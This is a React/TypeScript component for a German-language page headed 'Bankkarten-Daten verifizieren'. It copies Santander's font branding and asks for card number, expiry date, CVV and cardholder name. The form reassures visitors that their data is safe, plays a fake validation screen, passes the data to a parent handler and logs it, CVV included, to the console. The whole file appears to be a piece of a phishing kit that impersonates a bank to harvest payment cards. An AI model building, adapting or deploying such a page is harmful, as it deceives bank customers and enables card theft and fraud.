import React, { useState } from 'react';
import Loading from './Loading';
import { Lock } from 'lucide-react';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  // Individual state variables like PersonalDataForm
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  
  // Focus states exactly like PersonalDataForm
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expiryDateFocused, setExpiryDateFocused] = useState(false);
  const [cvvFocused, setCvvFocused] = useState(false);
  const [cardholderNameFocused, setCardholderNameFocused] = useState(false);

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      if (parseInt(month) === 0) {
        month = '01';
      }
      
      return month + (year ? '/' + year : '');
    }
    return v;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      console.log('BankCardForm: Submitting data:', {
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName
      });
      await onSubmit({
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName
      });
    } catch (error: any) {
      console.error('Error submitting bank card data:', error);
      
      // Handle backend validation errors
      if (error.details && Array.isArray(error.details)) {
        const backendErrors: Partial<BankCardData> = {};
        
        error.details.forEach((detail: any) => {
          if (detail.field === 'expiry_date') {
            backendErrors.expiry_date = 'Ungültiges Ablaufdatum. Format: MM/JJ (Monat 01-12)';
          } else if (detail.field === 'card_number') {
            backendErrors.card_number = 'Ungültige Kartennummer';
          } else if (detail.field === 'cvv') {
            backendErrors.cvv = 'Ungültige CVV';
          } else if (detail.field === 'cardholder_name') {
            backendErrors.cardholder_name = 'Ungültiger Karteninhaber-Name';
          }
        });
        
        setErrors(backendErrors);
      }
      setIsLoading(false); // Only stop loading on error
    }
    // Don't set isLoading to false on success - let the parent component handle state transitions
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (!/^\d+(\s\d+)*$/.test(cardNumber.trim())) {
      newErrors.card_number = 'Kartennummer darf nur Zahlen enthalten';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Ungültiges Format. Verwenden Sie MM/JJ (Monat 01-12)';
    }
    
    if (!cvv.trim()) {
      newErrors.cvv = 'CVV ist erforderlich';
    } else if (cvv.length < 3) {
      newErrors.cvv = 'CVV muss 3-4 Ziffern haben';
    }
    
    if (!cardholderName.trim()) {
      newErrors.cardholder_name = 'Karteninhaber ist erforderlich';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      {isLoading && (
        <Loading 
          message="Bankkarten-Daten werden validiert"
          type="verification"
          showProgress={true}
          duration={3.5}
        />
      )}
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '4rem 0',
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '6rem'
      }}>
        <div style={{
          maxWidth: '1000px',
          width: '100%',
          padding: '0 2rem'
        }}>
          {/* Large Title */}
          <h1 className="mobile-title" style={{
            color: '#444',
            fontSize: '4rem',
            fontWeight: 'bold',
            marginBottom: '1rem',
            fontFamily: 'santander_headline_bold, Arial, sans-serif',
            lineHeight: '1.1',
            letterSpacing: '-0.02em'
          }}>
            Bankkarten-Daten verifizieren
          </h1>
          
          <p style={{
            color: '#666',
            fontSize: '1rem',
            lineHeight: '1.6',
            marginBottom: '3rem',
            fontFamily: 'santander_regular, Arial, sans-serif'
          }}>
            Bitte geben Sie Ihre Bankkarten-Daten zur weiteren Verifizierung ein.
          </p>
          
          <form onSubmit={handleSubmit}>
            {/* Card Number */}
            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
              <input
                id="cardNumber"
                name="cardNumber"
                type="text"
                required
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                onFocus={() => setCardNumberFocused(true)}
                onBlur={() => setCardNumberFocused(false)}
                maxLength={19}
                style={{
                  width: '100%',
                  padding: '1.5rem 0 0.5rem 0',
                  border: 'none',
                  borderBottom: '2px solid #d1d5db',
                  backgroundColor: 'transparent',
                  fontSize: '1.1rem',
                  color: '#444',
                  outline: 'none',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'border-color 0.3s ease',
                  letterSpacing: '2px'
                }}
              />
              <label
                htmlFor="cardNumber"
                style={{
                  position: 'absolute',
                  left: '0',
                  top: cardNumberFocused || cardNumber ? '0.25rem' : '1rem',
                  fontSize: cardNumberFocused || cardNumber ? '0.75rem' : '1.1rem',
                  color: cardNumberFocused || cardNumber ? '#6b7280' : '#9ca3af',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  pointerEvents: 'none',
                  transformOrigin: 'left top'
                }}
              >
                Kartennummer *
              </label>
              {errors.card_number && (
                <div style={{
                  color: '#dc2626',
                  fontSize: '0.875rem',
                  marginTop: '0.5rem',
                  fontFamily: 'santander_regular, Arial, sans-serif'
                }}>
                  {errors.card_number}
                </div>
              )}
            </div>
            
            {/* Expiry Date and CVV */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2rem', marginBottom: '1rem' }}>
              {/* Expiry Date */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="expiryDate"
                  name="expiryDate"
                  type="text"
                  required
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                  onFocus={() => setExpiryDateFocused(true)}
                  onBlur={() => setExpiryDateFocused(false)}
                  maxLength={5}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="expiryDate"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: expiryDateFocused || expiryDate ? '0.25rem' : '1rem',
                    fontSize: expiryDateFocused || expiryDate ? '0.75rem' : '1.1rem',
                    color: expiryDateFocused || expiryDate ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top',
                    overflow: 'hidden',
                    textOverflow: 'ellipsis',
                    whiteSpace: 'nowrap',
                    maxWidth: '100%'
                  }}
                >
                  Ablaufdatum (MM/JJ) *
                </label>
                {errors.expiry_date && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.expiry_date}
                  </div>
                )}
              </div>
              
              {/* CVV */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="cvv"
                  name="cvv"
                  type="text"
                  required
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').substring(0, 4))}
                  onFocus={() => setCvvFocused(true)}
                  onBlur={() => setCvvFocused(false)}
                  maxLength={4}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="cvv"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: cvvFocused || cvv ? '0.25rem' : '1rem',
                    fontSize: cvvFocused || cvv ? '0.75rem' : '1.1rem',
                    color: cvvFocused || cvv ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  CVV *
                </label>
                {errors.cvv && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.cvv}
                  </div>
                )}
              </div>
            </div>
            
            {/* Cardholder Name */}
            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
              <input
                id="cardholderName"
                name="cardholderName"
                type="text"
                required
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value.toUpperCase())}
                onFocus={() => setCardholderNameFocused(true)}
                onBlur={() => setCardholderNameFocused(false)}
                style={{
                  width: '100%',
                  padding: '1.5rem 0 0.5rem 0',
                  border: 'none',
                  borderBottom: '2px solid #d1d5db',
                  backgroundColor: 'transparent',
                  fontSize: '1.1rem',
                  color: '#444',
                  outline: 'none',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'border-color 0.3s ease',
                  textTransform: 'uppercase'
                }}
              />
              <label
                htmlFor="cardholderName"
                style={{
                  position: 'absolute',
                  left: '0',
                  top: cardholderNameFocused || cardholderName ? '0.25rem' : '1rem',
                  fontSize: cardholderNameFocused || cardholderName ? '0.75rem' : '1.1rem',
                  color: cardholderNameFocused || cardholderName ? '#6b7280' : '#9ca3af',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  pointerEvents: 'none',
                  transformOrigin: 'left top'
                }}
              >
                Karteninhaber *
              </label>
              {errors.cardholder_name && (
                <div style={{
                  color: '#dc2626',
                  fontSize: '0.875rem',
                  marginTop: '0.5rem',
                  fontFamily: 'santander_regular, Arial, sans-serif'
                }}>
                  {errors.cardholder_name}
                </div>
              )}
            </div>
            
            {/* Security Notice */}
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #e9ecef',
              borderRadius: '8px',
              padding: '1.5rem',
              marginBottom: '2rem'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', marginBottom: '0.5rem' }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#444" strokeWidth="2" style={{ marginRight: '0.75rem' }}>
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                  <circle cx="12" cy="16" r="1"/>
                  <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
                <p style={{
                  color: '#444',
                  fontSize: '1rem',
                  fontWeight: '600',
                  margin: 0,
                  fontFamily: 'santander_bold, Arial, sans-serif'
                }}>
                  Ihre Daten sind sicher
                </p>
              </div>
              <p style={{
                color: '#666',
                fontSize: '0.875rem',
                margin: 0,
                lineHeight: '1.4',
                fontFamily: 'santander_regular, Arial, sans-serif'
              }}>
                Alle Daten werden verschlüsselt übertragen und gemäß den höchsten Sicherheitsstandards verarbeitet.
              </p>
            </div>
            
            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              style={{
                backgroundColor: '#9e3667',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 32px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontFamily: 'santander_bold, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                opacity: isLoading ? 0.7 : 1,
                marginTop: '2rem',
                width: '100%',
                maxWidth: '300px'
              }}
              onMouseEnter={(e) => {
                if (!isLoading) {
                  e.currentTarget.style.backgroundColor = '#8a2f5a';
                  e.currentTarget.style.transform = 'translateY(-1px)';
                }
              }}
              onMouseLeave={(e) => {
                if (!isLoading) {
                  e.currentTarget.style.backgroundColor = '#9e3667';
                  e.currentTarget.style.transform = 'translateY(0)';
                }
              }}
            >
              {isLoading ? 'Daten werden validiert...' : 'Daten bestätigen'}
              {!isLoading && (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M5 12h14M12 5l7 7-7 7"/>
                </svg>
              )}
            </button>

            {/* Skip Button */}
            {onSkip && (
              <button
                type="button"
                onClick={onSkip}
                disabled={isLoading}
                style={{
                  backgroundColor: 'transparent',
                  color: '#9e3667',
                  border: 'none',
                  padding: '0.75rem 1rem',
                  fontSize: '0.875rem',
                  fontWeight: '400',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  opacity: isLoading ? 0.5 : 0.7,
                  marginTop: '1rem',
                  textDecoration: 'underline',
                  textAlign: 'center' as const,
                  width: '100%',
                  maxWidth: '300px'
                }}
                onMouseOver={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.opacity = '1';
                    e.currentTarget.style.color = '#8a2f5a';
                  }
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.opacity = '0.7';
                  e.currentTarget.style.color = '#9e3667';
                }}
              >
                Ich habe keine Kreditkarte
              </button>
            )}
          </form>
        </div>
      </div>
    </>
  );
};

export default BankCardForm; 